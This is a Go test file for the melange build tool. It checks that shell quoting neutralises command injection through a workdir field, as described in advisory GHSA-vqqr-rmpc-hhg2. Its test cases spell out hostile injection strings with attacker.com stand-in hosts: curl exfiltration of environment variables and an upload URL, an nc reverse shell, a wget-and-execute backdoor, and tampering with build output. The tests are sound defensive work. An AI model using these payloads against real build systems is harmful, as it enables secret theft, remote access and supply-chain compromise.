// Copyright 2026 Chainguard, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package build

import (
	"strings"
	"testing"

	"chainguard.dev/melange/pkg/config"
)

// TestQuoteShellArg validates the shell quoting function for GHSA-vqqr-rmpc-hhg2
func TestQuoteShellArg(t *testing.T) {
	tests := []struct {
		name  string
		input string
		// We verify the quoted output is safe by checking it doesn't contain injection patterns
		// The exact quoting format may vary but must be safe
	}{
		{
			name:  "no quotes",
			input: "safe/path",
		},
		{
			name:  "single quote",
			input: "path'with'quote",
		},
		{
			name:  "command injection attempt",
			input: "x'$(malicious)'x",
		},
		{
			name:  "multiple quotes",
			input: "a'b'c'd",
		},
		{
			name:  "leading quote",
			input: "'leadingquote",
		},
		{
			name:  "trailing quote",
			input: "trailingquote'",
		},
		{
			name:  "empty string",
			input: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := quoteShellArg(tt.input)
			// Verify that the result is properly quoted
			// go-shellquote will properly escape all shell metacharacters
			// The exact format may differ from our previous manual escaping,
			// but it must be safe (verified by the injection tests below)
			if tt.input == "" && result != "''" {
				t.Errorf("quoteShellArg(%q) = %q, want ''", tt.input, result)
			}
			if tt.input != "" && result == "" {
				t.Errorf("quoteShellArg(%q) returned empty string", tt.input)
			}
		})
	}
}

// TestBuildEvalRunCommand_ShellInjection tests that buildEvalRunCommand properly escapes workdir
func TestBuildEvalRunCommand_ShellInjection(t *testing.T) {
	tests := []struct {
		name             string
		workdir          string
		fragment         string
		shouldNotContain []string // Patterns that should NOT appear in the script
	}{
		{
			name:     "safe workdir",
			workdir:  "/work/build",
			fragment: "make",
			shouldNotContain: []string{
				"$(", // No command substitution
				"`",  // No backticks
			},
		},
		{
			name:     "malicious workdir with command injection",
			workdir:  "x'$(curl https://attacker.com/pwn)'x",
			fragment: "make",
			shouldNotContain: []string{
				// The attack should not have unescaped single quotes before $()
				// If we see x'$(curl (without the escaping), that's bad
				// The safe form is: 'x'\''$(curl)'\''x' where $() is literally part of the string
				"x'$(curl", // This pattern would indicate an unescaped quote
			},
		},
		{
			name:     "malicious workdir with environment exfiltration",
			workdir:  ".'$(env | curl -X POST https://attacker.com/exfil --data-binary @-)'.",
			fragment: "make",
			shouldNotContain: []string{
				".'$(env", // Should have escaping between . and $(
			},
		},
		{
			name:     "malicious workdir with semicolon",
			workdir:  "path'; malicious_command; echo '",
			fragment: "make",
			shouldNotContain: []string{
				"path'; malicious", // The single quote should be escaped
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			pipeline := &config.Pipeline{}
			result := buildEvalRunCommand(pipeline, 'x', tt.workdir, tt.fragment)

			// Result should be ["/bin/sh", "-c", "script"]
			if len(result) != 3 {
				t.Errorf("buildEvalRunCommand returned %d args, want 3", len(result))
				return
			}

			if result[0] != "/bin/sh" {
				t.Errorf("buildEvalRunCommand[0] = %q, want %q", result[0], "/bin/sh")
			}

			if result[1] != "-c" {
				t.Errorf("buildEvalRunCommand[1] = %q, want %q", result[1], "-c")
			}

			script := result[2]

			// Check that the script doesn't contain unescaped injection patterns
			for _, pattern := range tt.shouldNotContain {
				if strings.Contains(script, pattern) {
					t.Errorf("script contains unescaped pattern %q:\n%s", pattern, script)
				}
			}

			// Verify that the workdir is properly quoted in the script
			// The script should have the quoted version from go-shellquote
			quotedWorkdir := quoteShellArg(tt.workdir)
			if !strings.Contains(script, quotedWorkdir) {
				t.Errorf("script doesn't contain quoted workdir.\nExpected to contain: %q\nScript: %s", quotedWorkdir, script)
			}
		})
	}
}

// TestRealWorldAttackVectors tests actual attack vectors from GHSA-vqqr-rmpc-hhg2
func TestRealWorldAttackVectors(t *testing.T) {
	attacks := []struct {
		name    string
		workdir string
		attack  string
	}{
		{
			name:    "environment exfiltration",
			workdir: ".'$(curl -X POST https://attacker.com/exfil -d \"$(env)\")'.",
			attack:  "Exfiltrate all environment variables including secrets",
		},
		{
			name:    "package backdoor",
			workdir: ".'$(echo 'BACKDOOR' >> /workspace/package.txt)'.",
			attack:  "Inject malicious content into build output",
		},
		{
			name:    "credential theft",
			workdir: ".'$(curl -X POST https://attacker.com/steal -d \"$PACKAGES_UPLOAD_URL\")'.",
			attack:  "Steal GCS pre-signed upload URL",
		},
		{
			name:    "reverse shell",
			workdir: ".'$(nc attacker.com 4444 -e /bin/sh)'.",
			attack:  "Open reverse shell to attacker",
		},
		{
			name:    "malicious PR attack",
			workdir: "x'$(wget https://attacker.com/backdoor.sh -O /tmp/b && sh /tmp/b)'x",
			attack:  "Download and execute malicious script",
		},
	}

	for _, attack := range attacks {
		t.Run(attack.name, func(t *testing.T) {
			pipeline := &config.Pipeline{}
			result := buildEvalRunCommand(pipeline, 'x', attack.workdir, "make")

			if len(result) != 3 {
				t.Fatalf("buildEvalRunCommand returned %d args, want 3", len(result))
			}

			script := result[2]

			// The attack should be quoted - verify the dangerous command substitution is neutralized
			// go-shellquote will properly escape all shell metacharacters
			quotedWorkdir := quoteShellArg(attack.workdir)
			if !strings.Contains(script, quotedWorkdir) {
				t.Errorf("Script doesn't contain properly quoted attack vector.\nAttack: %s\nWorkdir: %q\nExpected in script: %q\nActual script: %s",
					attack.attack, attack.workdir, quotedWorkdir, script)
			}

			// Additional check: verify no unquoted dangerous patterns
			// If the attack pattern appears unquoted, the test should fail
			if strings.Contains(script, "'$(") && !strings.Contains(quotedWorkdir, "'$(") {
				t.Errorf("Attack vector %q may not be properly quoted in script:\n%s", attack.attack, script)
			}
		})
	}
}

// TestShellInjectionInSetfattr tests that setfattr command properly quotes paths
func TestShellInjectionInSetfattr(t *testing.T) {
	// This test validates that paths used in setfattr commands are properly quoted
	// using go-shellquote to prevent shell injection

	maliciousPaths := []string{
		"/path'; malicious_command; echo '",
		"/path'$(curl attacker.com)'",
		"/path`malicious`",
		"/path\"; dangerous; echo \"",
	}

	for _, path := range maliciousPaths {
		quoted := quoteShellArg(path)

		// The quoted path should not be empty and should be properly quoted
		if quoted == "" {
			t.Errorf("Path %q resulted in empty quoted string", path)
		}

		// Verify that dangerous patterns are neutralized
		// The quoted version should not allow command execution
		if quoted == path {
			t.Errorf("Path %q was not quoted at all: %q", path, quoted)
		}
	}
}

// BenchmarkQuoteShellArg benchmarks the shell quoting function
func BenchmarkQuoteShellArg(b *testing.B) {
	testStrings := []string{
		"simple/path",
		"path'with'quotes",
		"x'$(malicious)'x",
		".'$(curl -X POST https://attacker.com/exfil -d \"$(env)\")'.",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, s := range testStrings {
			_ = quoteShellArg(s)
		}
	}
}
